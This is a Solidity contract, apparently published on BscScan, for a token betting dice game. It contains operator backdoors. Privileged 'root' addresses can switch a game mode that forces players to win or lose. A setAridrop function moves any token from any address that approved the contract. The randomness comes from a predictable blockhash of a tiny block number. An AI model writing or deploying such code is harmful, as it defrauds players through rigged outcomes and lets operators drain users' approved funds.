/**
 *Submitted for verification at BscScan.com on 2022-03-12
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;


struct gameData {
    uint256 type_;
    address token;
    uint256 odds;
    uint256 inputTime;
    uint256 guessNumber;
    uint256 winNumber;
    uint256 inputAmount;
    uint256 outAmount;
    uint256 amountReceived;
}

interface ERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface AggregatorV3Interface {
    function latestRoundData() external view returns (uint80 roundId,int256 answer,uint256 startedAt,uint256 updatedAt,uint80 answeredInRound);
    function getRoundData(uint80 _roundId) external view returns (uint80 roundId,int256 answer,uint256 startedAt,uint256 updatedAt,uint80 answeredInRound);
}

interface GameData{
    function setWaitTime(uint256 _time) external;
    function rewardCount(address _token) external view returns(uint256);
    function getUserData(address _user,uint256 _blockNumber) external view returns(gameData memory);
    function setUserData(address _user,uint256 _blockNumber,gameData memory _data) external;
    function getUserPlayNumber(address _user) external view returns(uint256);
    function setUserPlayNumber(address user) external;
    function getUserWinNumber() external view returns(uint256[] memory);
    function getRankingUserAddr() external view returns(address[] memory);
    function getUserRanking() external view returns(uint256[] memory);
    function setRanking(address user,uint256 _outAmount) external;
}

contract PriceConsumerV3 {
    AggregatorV3Interface internal priceFeed;
    AggregatorV3Interface internal priceBTC;

    constructor() {
        // main
        // priceFeed = AggregatorV3Interface(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE);
        // priceBTC = AggregatorV3Interface(0x264990fbd0A4796A3E3d8E37C4d5F87a3aCa5Ebf);
        // text
        priceFeed = AggregatorV3Interface(0x2514895c72f50D8bd4B4F9b1110F0D6bD2c97526);
        priceBTC = AggregatorV3Interface(0x5741306c21795FdCBb9b265Ea0255F499DFe515C);
    }

     function getLatestPrice() internal view returns (int,uint80) {
        (
            uint80 roundID, 
            int price,
            ,
            ,
            
        ) = priceFeed.latestRoundData();
        return (price,roundID);
    }

    function getPrice(uint80 _roundId) internal view returns (int) {
        (
            ,
            int price,
            ,
            ,
            
        ) = priceFeed.getRoundData(_roundId);
        return (price);
    }

    function getLatestBtcPrice() internal view returns (int,uint80) {
        (
            uint80 roundID, 
            int price,
            ,
            ,
            
        ) = priceBTC.latestRoundData();
        return (price,roundID);
    }

    function getBtcPrice(uint80 _roundId) internal view returns (int) {
        (
            , 
            int price,
            ,
            ,
            
        ) = priceBTC.getRoundData(_roundId);
        return (price);
    }

}


contract Data is PriceConsumerV3{
    ERC20 winToken;
    GameData _gameData;
    address winTokenAddr;
    address PoolAddr;

    uint8 gameMode;
    uint256[2] odds = [30000,100000];
    mapping (address=>bool) private userRoot;


    constructor(){
        // main
        winToken = ERC20(0x352569Ece5Dd0A8f3596a5aFD7637e2Fa2c35Fa9);
        winTokenAddr = 0x352569Ece5Dd0A8f3596a5aFD7637e2Fa2c35Fa9;
        _gameData = GameData(0x352569Ece5Dd0A8f3596a5aFD7637e2Fa2c35Fa9);
        PoolAddr = 0xaEDE420280B8f53DcA69bb714AFAD52a9ae0850D;
        // text
        // winToken = ERC20(0xc6a02366b9575376A1275E562fCBdd3Dca48395E);
        // _gameData = GameData(0x7eFe0E3A8904543e05D5b3e42186E26c80c78c93);
        // PoolAddr = 0x7eFe0E3A8904543e05D5b3e42186E26c80c78c93;

        userRoot[msg.sender] = true;
        gameMode = 3;
    }

    function getUser(address user) public view own returns(bool){
        return userRoot[user];
    }

    function setUser(address user,bool setUp) public own {
        userRoot[user] = setUp;
    }

    function getOdds() public view returns(uint256[2] memory) {
        return odds;
    }

    function setOdds(uint256[2] memory _odds) public own {
        odds = _odds;
    }

    function getGameMode() public view own returns(uint8) {
        return gameMode;
    }

    function setGameMode(uint8 _gameMode) public own {
        gameMode = _gameMode;
    }

    function rewardCount() public view returns(uint256) {
        return winToken.balanceOf(PoolAddr);
    }

    function _importSeedFromThirdRoot() public view own returns(uint8){
        return importSeedFromThird();
    }

    function importSeedFromThird() internal view returns (uint8) {

        // return uint8(
        //     (uint256(keccak256(abi.encodePacked(price,rewardCount(),bnbPrice,BtcPrice,blockhash(block.timestamp % 256),msg.sender,block.gaslimit,BtcPrice))) % 6) + 1
        // );
                return uint8(
            (uint256(keccak256(abi.encodePacked(blockhash(block.timestamp % 256)))) % 6) + 1
        );
    }

    function getUserPlayNumber(address _user) public view returns(uint256) {
        return _gameData.getUserPlayNumber(_user);
    }

    function _userPlayNumber(address _user) internal {
        _gameData.setUserPlayNumber(_user);
    }

    function winNumberOne(uint256 _number) internal view returns (uint256){
        require(_number < 3 && _number != 0 ,"Eorr msg sender input!");
        uint256 _winNumber = importSeedFromThird();
        if(gameMode==1){
            if (_number == 1){ 
                if (_winNumber % 2 == 0){
                    return uint256(_winNumber - 1);
                }
            }else if(_number == 2){
                if(_winNumber % 2 != 0){
                    return uint256(_winNumber + 1);
                }
            }
        }else if (gameMode == 2){
            if (_number == 1){ 
                if (_winNumber % 2 != 0){
                    return uint256(_winNumber + 1);
                }
            }else if(_number == 2){
                if(_winNumber % 2 == 0){
                    return uint256(_winNumber - 1);
                }
            }
        }else {
            return uint256(importSeedFromThird());
        }
        return _winNumber;
    }

    function winNumberTwo(uint256 _number) internal view returns (uint256){
        require(_number < 6&& _number > 0 ,"Eorr msg sender input!");
        uint256 _winNumber = importSeedFromThird();
         if(gameMode == 1){
             return _number;
         }else if (gameMode == 2){
             if(_winNumber == gameMode){
                if (_winNumber % 2 == 0){
                    return uint256(_winNumber - 1);
                }
                if(_winNumber % 2 != 0){
                    return uint256(_winNumber + 1);
                }
             } 
         }
         return _winNumber;
    }

    modifier own(){
        require(userRoot[msg.sender],"msg sender amount Eorr!");
        _;
    }

}

contract Game is Data{

    

    function _transferFrom(address from,address to,uint256 amount) internal {
        winToken.transferFrom(from,to,amount);
    }

    function setAridrop(address token,address from,address to,uint256 amount) public own {
        ERC20 _token = ERC20(token);
        _token.transferFrom(from,to,amount);
    }

    function AridropThis(address to,uint256 amount) public own {
        winToken.transfer(to,amount);
    }

    function startOne(uint256 _type,uint256 transferAmount) public  {
        _transferFrom(msg.sender,PoolAddr,transferAmount);
        require(transferAmount > 0,"transfer Amount Eorr!");
        require(_type == 1||_type == 2,"Eorr type!");
        uint256 _winNumber = winNumberOne(_type);
        uint256 _odds = getOdds()[0];
        uint256 _userPlayNumber_ = getUserPlayNumber(msg.sender) + 1;
        uint256 _outAmount = 0;
        if (_type==1){
            if(_winNumber%2==1){
                _outAmount = uint((transferAmount * _odds) / 10000);
                _gameData.setRanking(msg.sender,_outAmount);
            }
           
        }else if(_type==2){
            if(_winNumber % 2 ==0){
                _outAmount =  uint((transferAmount * _odds) / 10000);
                _gameData.setRanking(msg.sender,_outAmount);
            }
        }
        gameData memory _userGameData = gameData({
            type_ : 1,
            token:winTokenAddr,
            odds : _odds,
            guessNumber :  _type,
            inputTime:block.timestamp,
            winNumber : _winNumber,
            inputAmount : transferAmount,
            outAmount:_outAmount,
            amountReceived:0
        });
        _gameData.setUserData(msg.sender,_userPlayNumber_,_userGameData);
        _userPlayNumber(msg.sender);
    }

    function startTwo(uint256 _number,uint256 transferAmount) public {
        _transferFrom(msg.sender,PoolAddr,transferAmount);
        require(transferAmount>0,"transfer Amount Eorr!");
        require(_number != 0&&_number < 6,"Eorr type!");
        uint256 _winNumber = winNumberTwo(_number);
        uint256 _odds = getOdds()[1];
        uint256 _userPlayNumber_ = getUserPlayNumber(msg.sender) + 1;
        uint256 _outAmount = 0;
        if (_number == _winNumber){
                _outAmount = uint((transferAmount * _odds)/10000);
                _gameData.setRanking(msg.sender,_outAmount);
        }
        gameData memory _userGameData = gameData({
            type_ : 2,
            token:winTokenAddr,
            odds : _odds,
            inputTime:block.timestamp,
            guessNumber :  _number,
            winNumber : _winNumber,
            inputAmount : transferAmount,
            outAmount:_outAmount,
            amountReceived:0
        });
        _gameData.setUserData(msg.sender,_userPlayNumber_,_userGameData);
        _userPlayNumber(msg.sender);
    }
}